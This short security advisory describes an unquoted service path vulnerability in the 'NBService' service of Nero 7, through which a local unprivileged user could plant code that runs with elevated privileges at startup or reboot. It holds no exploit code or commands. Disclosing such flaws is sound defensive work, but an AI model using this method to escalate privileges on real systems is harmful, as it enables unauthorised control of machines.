Vulnerability Details:
=====================
The nero 7 suffers from an unquoted search path issue impacting the 
service "NBService" leading to arbitrary code execution, this could 
potentially allow an authorized unprivileged user to invoke  a malicious 
peice of code with elevated privileges.
A successful exploit requires a local user to put its own code in the 
path of the vulnerable application where it could potentially be 
executed during the software startup or system reboot.
